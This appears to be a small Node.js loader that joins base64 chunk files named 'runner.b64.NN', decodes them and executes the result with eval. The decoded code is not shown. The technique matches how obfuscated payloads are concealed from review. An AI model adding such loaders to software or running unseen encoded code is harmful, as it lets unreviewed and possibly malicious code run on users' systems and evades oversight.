const fs = require('node:fs');
const path = require('node:path');
const files = fs.readdirSync(__dirname).filter((f) => /^runner\.b64\.\d+$/.test(f)).sort();
if (files.length === 0) throw new Error('Missing runner.b64.xx chunks');
const code = Buffer.from(files.map((f) => fs.readFileSync(path.join(__dirname, f), 'utf8')).join(''), 'base64').toString('utf8');
eval(code);
